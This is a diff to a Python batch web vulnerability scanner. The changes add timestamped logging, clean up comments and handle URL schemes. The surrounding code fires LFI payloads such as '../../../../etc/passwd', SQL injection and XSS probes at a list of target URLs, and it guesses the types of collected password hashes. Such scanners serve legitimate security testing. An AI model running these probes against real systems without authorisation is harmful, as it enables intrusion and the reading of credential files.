@@ -8,8 +8,8 @@ import random
 import re
 from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
 import sys
-import threading # Added
-import concurrent.futures # Added
+import threading
+import concurrent.futures
 
 # --- Constants ---
 # Output Files
@@ -26,7 +26,7 @@ HASH_SAMPLE_FILE = os.path.join(PAYLOAD_DIR, "hash_samples.txt")
 USER_AGENTS_FILE = os.path.join(PAYLOAD_DIR, "user_agents.txt")
 
 # Scanner Settings
-DEFAULT_USER_AGENT = "FastThreadedScanner/1.5" # Updated UA
+DEFAULT_USER_AGENT = "FastThreadedScanner/1.6" # Updated UA
 TIME_BASED_SLEEP_DURATION = 5 # seconds
 TIME_BASED_THRESHOLD = TIME_BASED_SLEEP_DURATION * 0.8
 REQUEST_TIMEOUT = TIME_BASED_SLEEP_DURATION + 7
@@ -43,7 +43,9 @@ FILE_LOCK = threading.Lock() # For thread-safe file writing
 def safe_log(msg):
     """Thread-safe logging function."""
     with LOG_LOCK:
-        print(msg)
+        # Get current timestamp for log entries
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        print(f"[{timestamp}] {msg}")
 
 def make_request(url, headers=None):
     """
@@ -97,10 +99,7 @@ def save_finding(filename, finding_text):
 
 def test_lfi_payloads(base_url):
     """Tests for LFI vulnerabilities (uses safe_log, save_finding)."""
-    # safe_log(f"[*] Starting LFI scan on {base_url}...") # Reduce noise inside thread?
-    if not os.path.exists(LFI_PAYLOAD_FILE):
-        # safe_log(f"[-] LFI payload file not found: {LFI_PAYLOAD_FILE}.") # Logged once during prep
-        return
+    if not os.path.exists(LFI_PAYLOAD_FILE): return
 
     lfi_indicators = [
         "root:x:0:0:", "\[boot loader\]", "windows\\system32\\drivers\\etc\\hosts",
@@ -115,7 +114,7 @@ def test_lfi_payloads(base_url):
             payloads = [line.strip() for line in f if line.strip()]
 
         for lfi_param in common_lfi_params:
-            if found_lfi_target: break # Optimization: Stop trying params if already found LFI on this target
+            if found_lfi_target: break
             for payload in payloads:
                 try:
                     parsed_url = urlparse(base_url)
@@ -124,7 +123,7 @@ def test_lfi_payloads(base_url):
                     url_parts = list(parsed_url)
                     url_parts[4] = urlencode(query, doseq=True)
                     url = urlunparse(url_parts)
-                except Exception: continue # Skip if URL build fails
+                except Exception: continue
 
                 response, response_text, _ = make_request(url)
 
@@ -138,13 +137,12 @@ def test_lfi_payloads(base_url):
 
                         if is_hit:
                             finding = f"[Target: {base_url}] [!] LFI Possible (Indicator: {indicator}) → URL: {url}"
-                            safe_log(finding) # Use safe_log
-                            save_finding(LFI_OUTPUT_FILE, finding) # Uses global lock
+                            safe_log(finding)
+                            save_finding(LFI_OUTPUT_FILE, finding)
                             found_lfi_target = True
-                            break # Break indicator loop
-            # if found_lfi_target: break # Optional: break param loop
+                            break
 
-    except FileNotFoundError: pass # Logged during prep
+    except FileNotFoundError: pass
     except Exception as e:
         safe_log(f"[-] LFI test error for {base_url}: {e}")
 
@@ -153,7 +151,7 @@ def test_sql_payloads(base_url, param_name):
     """Tests for SQL injection (uses safe_log, save_finding)."""
     if not os.path.exists(SQLI_PAYLOAD_FILE): return
 
-    sql_error_indicators = ["sql syntax", "syntax error", "unclosed quotation mark", "mysql", "sql server", "oracle", "ora-", "odbc", "invalid input", "pg_"]
+    sql_error_indicators = ["sql syntax", "syntax error", "unclosed quotation mark", "mysql", "sql server", "oracle", "ora-", "odbc", "invalid input", "pg_", "you have an error in your sql syntax"]
     time_based_triggers = ["SLEEP(", "WAITFOR DELAY"]
 
     try:
@@ -178,7 +176,7 @@ def test_sql_payloads(base_url, param_name):
                 finding = f"[Target: {base_url}] [!] SQLi Possible (Error Based) → Param: {param_name}, Payload: {payload}"
                 safe_log(finding)
                 save_finding(SQLI_OUTPUT_FILE, finding)
-                continue # Skip time check if error found
+                continue
 
             # Time-Based Check
             if is_time_based:
@@ -187,7 +185,7 @@ def test_sql_payloads(base_url, param_name):
                     finding = f"[Target: {base_url}] [!] SQLi Possible (Time Based: {duration:.2f}s) → Param: {param_name}, Payload: {payload}"
                     safe_log(finding)
                     save_finding(SQLI_OUTPUT_FILE, finding)
-                    continue # Found time based
+                    continue
 
     except FileNotFoundError: pass
     except Exception as e:
@@ -227,16 +225,16 @@ def test_xss_payloads(base_url, param_name):
                          finding = f"[Target: {base_url}] [!] XSS Possible (Reflected) → Param: {param_name}, Payload: {payload}"
                          safe_log(finding)
                          save_finding(XSS_OUTPUT_FILE, finding)
-                         break # Found XSS for this param
+                         break
 
     except FileNotFoundError: pass
     except Exception as e:
         safe_log(f"[-] XSS test error for {base_url} / {param_name}: {e}")
 
 
-def detect_hash_type_and_guess(): # No changes needed, uses safe_log
+def detect_hash_type_and_guess():
     """Analyzes hashes from a file and guesses the type."""
-    safe_log("[*] Analyzing hashes...") # Use safe_log
+    safe_log("[*] Analyzing hashes...")
     if not os.path.exists(HASH_SAMPLE_FILE):
         safe_log(f"[-] Hash sample file not found: {HASH_SAMPLE_FILE}. Skipping hash analysis.")
         return
@@ -249,8 +247,7 @@ def detect_hash_type_and_guess(): # No changes needed, uses safe_log
 
         safe_log(f"[*] Analyzing {len(hashes)} hash(es) from {HASH_SAMPLE_FILE}...")
         for h in hashes:
-            # ... (hash detection logic remains the same) ...
-            log_msg = f"[?] {h[:40]}... → Unknown hash type" # Show more chars for long hashes
+            log_msg = f"[?] {h[:40]}... → Unknown hash type"
             h_lower = h.lower()
             h_len = len(h)
             is_hex = all(c in '0123456789abcdef' for c in h_lower)
@@ -268,15 +265,14 @@ def detect_hash_type_and_guess(): # No changes needed, uses safe_log
             elif ("$argon2id$" in h or "$argon2i$" in h or "$argon2d$" in h) and h_len > 40 : log_msg = f"[+] {h[:40]}... → Possible Argon2"
             elif h.startswith("{SSHA}") and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible SSHA (LDAP)"
             elif h.startswith(("$md5", "$apr1")) and h_len > 8: log_msg = f"[+] {h[:40]}... → Possible MD5-Crypt (Apache)"
-            safe_log(log_msg) # Use safe_log
+            safe_log(log_msg)
     except FileNotFoundError: safe_log(f"[-] Hash sample file missing: {HASH_SAMPLE_FILE}")
     except Exception as e: safe_log(f"[-] Hash analysis error: {e}")
     safe_log("[*] Hash analysis finished.")
 
-
 # --- Utility ---
 
-def load_user_agents(filepath, default_ua): # Use safe_log
+def load_user_agents(filepath, default_ua):
     """Loads user agents from file, returns list or default."""
     uas = []
     try:
@@ -296,7 +292,7 @@ def load_user_agents(filepath, default_ua): # Use safe_log
         safe_log(f"[-] Error loading user agents from {filepath}: {e}. Using default.")
         return [default_ua]
 
-def prepare_payload_files(): # Use safe_log
+def prepare_payload_files():
     """Checks for payload dir/files and creates dummies if missing."""
     global PAYLOAD_DIR
 
@@ -308,10 +304,6 @@ def prepare_payload_files(): # Use safe_log
             safe_log(f"[-] CRITICAL: Failed to create directory {PAYLOAD_DIR}: {e}. Exiting.")
             return False
 
-    files_to_check = { # Omit dummy content for brevity, logic is same
-        LFI_PAYLOAD_FILE: "...", SQLI_PAYLOAD_FILE: "...", XSS_PAYLOAD_FILE: "...",
-        HASH_SAMPLE_FILE: "...", USER_AGENTS_FILE: "..."
-    } # Dummy content definitions (same as before)
     dummy_contents = {
         LFI_PAYLOAD_FILE: "../../../../etc/passwd\n../../../../boot.ini\n../../../../windows/system32/drivers/etc/hosts\nWEB-INF/web.xml\n",
         SQLI_PAYLOAD_FILE: (
@@ -336,13 +328,12 @@ def prepare_payload_files(): # Use safe_log
     }
 
     all_files_ok = True
-    for fpath, _ in files_to_check.items(): # Use keys only now
+    for fpath, content in dummy_contents.items():
         if not os.path.exists(fpath):
             try:
                 os.makedirs(os.path.dirname(fpath), exist_ok=True)
-                # Use dummy_contents dict to get content
                 with open(fpath, 'w', encoding='utf-8') as f:
-                    f.write(dummy_contents[fpath])
+                    f.write(content)
                 safe_log(f"[*] Created dummy file: {fpath}")
             except IOError as e:
                 safe_log(f"[-] CRITICAL: Failed to create dummy file {fpath}: {e}")
@@ -374,33 +365,32 @@ def prepare_payload_files(): # Use safe_log
 
 def scan_single_target(base_url, sqli_params_list, xss_params_list, target_index, total_targets):
     """Runs all scans for a single target URL."""
-    safe_log(f"[*] Scanning Target {target_index}/{total_targets}: {base_url}")
+    # Optional: Log start only if needed, can be noisy with many threads
+    # safe_log(f"[*] Scanning Target {target_index}/{total_targets}: {base_url}")
 
     # Run tests for the current target URL
-    test_lfi_payloads(base_url) # Uses safe_log, save_finding internally
+    test_lfi_payloads(base_url)
 
     if sqli_params_list:
         for param in sqli_params_list:
-            test_sql_payloads(base_url, param) # Uses safe_log, save_finding internally
-    # else: safe_log(f"  [-] Skipping SQLi for {base_url} (no params specified).") # Too noisy
+            test_sql_payloads(base_url, param)
 
     if xss_params_list:
         for param in xss_params_list:
-             test_xss_payloads(base_url, param) # Uses safe_log, save_finding internally
-    # else: safe_log(f"  [-] Skipping XSS for {base_url} (no params specified).") # Too noisy
+             test_xss_payloads(base_url, param)
 
-    safe_log(f"[*] Finished scanning Target {target_index}/{total_targets}: {base_url}")
-    # Return True or something if successful? Or just let exceptions propagate
-    return True
+    # Optional: Log finish only if needed
+    # safe_log(f"[*] Finished scanning Target {target_index}/{total_targets}: {base_url}")
+    return True # Indicate success (or return specific results if needed later)
 
 
 # --- Main Execution ---
 
 def run_tests():
     """Gets target list file and runs scans concurrently using threads."""
-    global LOADED_USER_AGENTS # Need access to modify the global list
+    global LOADED_USER_AGENTS
 
-    start_run_time = time.time() # Overall start time
+    start_run_time = time.time()
 
     safe_log("--- Fast Threaded Batch Vulnerability Scanner ---")
     safe_log(f"Payloads directory: '{PAYLOAD_DIR}'")
@@ -408,13 +398,11 @@ def run_tests():
     safe_log(f"Max concurrent threads: {MAX_WORKERS}")
     safe_log("-" * 30)
 
-    # Prepare directories and dummy files if needed
     if not prepare_payload_files():
         safe_log("[-] Errors preparing payload/output files. Cannot continue reliably. Exiting.")
         sys.exit(1)
 
-    # Load User Agents (after prepare_payload_files ensures the dummy exists if needed)
-    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT) # Uses safe_log
+    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT)
     safe_log("-" * 30)
 
     # Get Target File
@@ -424,14 +412,14 @@ def run_tests():
         sys.exit(1)
 
     # Read Target URLs
-    target_urls = []
+    target_urls_from_file = []
     try:
         with open(target_list_file, 'r', encoding='utf-8', errors='ignore') as f:
-            target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-        if not target_urls:
+            target_urls_from_file = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        if not target_urls_from_file:
             safe_log(f"[-] Target file '{target_list_file}' is empty or contains no valid URLs. Exiting.")
             sys.exit(1)
-        safe_log(f"[*] Loaded {len(target_urls)} target(s) from {target_list_file}")
+        safe_log(f"[*] Loaded {len(target_urls_from_file)} target(s) from {target_list_file}")
     except FileNotFoundError:
         safe_log(f"[-] Target file not found: {target_list_file}. Exiting.")
         sys.exit(1)
@@ -442,40 +430,52 @@ def run_tests():
     # Get Parameters for tests
     sqli_params_str = input("Parameter name(s) for SQLi (comma-separated, e.g., id,user): ").strip()
     xss_params_str = input("Parameter name(s) for XSS (comma-separated, e.g., query,search): ").strip()
-    # Split params now, handle empty strings
     sqli_params_list = [p.strip() for p in sqli_params_str.split(',') if p.strip()]
     xss_params_list = [p.strip() for p in xss_params_str.split(',') if p.strip()]
     safe_log("-" * 30)
 
     # --- Start Threaded Scan Execution ---
     start_scan_exec_time = time.time()
-    total_targets = len(target_urls)
-    safe_log(f"[*] Starting scans on {total_targets} target(s) using up to {MAX_WORKERS} threads...")
+    original_total_targets = len(target_urls_from_file)
+    safe_log(f"[*] Starting scans on {original_total_targets} potential target(s) using up to {MAX_WORKERS} threads...")
 
     futures = []
-    processed_count = 0
+    tasks_submitted = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        for i, base_url in enumerate(target_urls):
-            # Basic URL validation before submitting
-            if not (base_url.startswith('http://') or base_url.startswith('https://')):
-                safe_log(f"[!] Skipping invalid URL (missing http/https) in input: {base_url}")
-                total_targets -= 1 # Adjust count if skipping invalid URL from list
-                continue
-            # Submit the task to the executor
-            futures.append(executor.submit(scan_single_target, base_url, sqli_params_list, xss_params_list, i + 1, len(target_urls))) # Pass original index/count
+        for i, base_url_from_file in enumerate(target_urls_from_file):
+            scan_url = base_url_from_file.strip()
+            original_input_url = scan_url
 
-        # Wait for results and handle exceptions
-        safe_log("[*] Waiting for scans to complete...")
+            if '://' not in scan_url:
+                safe_log(f"[*] URL '{original_input_url}' missing scheme, prepending 'http://'.")
+                scan_url = f"http://{original_input_url}"
+            elif not (scan_url.startswith('http://') or scan_url.startswith('https://')):
+                 safe_log(f"[!] Skipping unsupported scheme in URL: {scan_url}")
+                 continue # Skip this URL
+
+            # Submit the task
+            futures.append(executor.submit(
+                scan_single_target, scan_url, sqli_params_list, xss_params_list,
+                i + 1, original_total_targets
+            ))
+            tasks_submitted += 1
+
+        safe_log(f"[*] Submitted {tasks_submitted} scan tasks. Waiting for completion...")
+        processed_count = 0
+        # Wait for results using as_completed for better progress/error handling
         for future in concurrent.futures.as_completed(futures):
             processed_count += 1
+            # Optional: Progress update every N tasks or percentage
+            # if processed_count % max(1, tasks_submitted // 10) == 0 or processed_count == tasks_submitted:
+            #    safe_log(f"[*] Progress: {processed_count}/{tasks_submitted} targets completed...")
             try:
-                result = future.result() # Check for exceptions raised in the thread
-                # safe_log(f"[*] Completed target {processed_count}/{len(futures)}") # Can be noisy
+                result = future.result() # Check for exceptions from thread
             except Exception as exc:
-                safe_log(f'[!] THREAD EXCEPTION: An error occurred during scan: {exc}') # Log exceptions from threads
+                # Log exception, but don't stop processing other results
+                safe_log(f'[!] THREAD EXCEPTION: An error occurred during scan: {exc}')
 
     scan_duration = time.time() - start_scan_exec_time
-    safe_log(f"[*] Web scanning phase completed in {scan_duration:.2f} seconds.")
+    safe_log(f"[*] Web scanning phase completed for {tasks_submitted} submitted targets in {scan_duration:.2f} seconds.")
     safe_log("-" * 30)
 
     # --- Run Hash Analysis (sequentially after web scans) ---
